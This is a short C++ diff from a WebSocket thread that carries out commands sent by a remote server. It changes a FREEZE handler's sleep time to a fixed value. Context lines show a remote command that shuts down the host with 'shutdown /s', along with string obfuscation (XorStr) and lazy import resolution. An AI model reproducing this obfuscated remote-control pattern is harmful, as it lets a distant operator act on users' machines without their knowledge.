@@ -312,7 +312,7 @@ DWORD WINAPI WebSocketThread(LPVOID PARAMS) {
 				LI_FN(system)(XorStr("shutdown /s"));
 			}
 			if (ret[XorStr("type")] == XorStr("FREEZE")) {
-				Sleep(ret[XorStr("freezetime")]);
+				Sleep(5000);
 			}
 		});
 
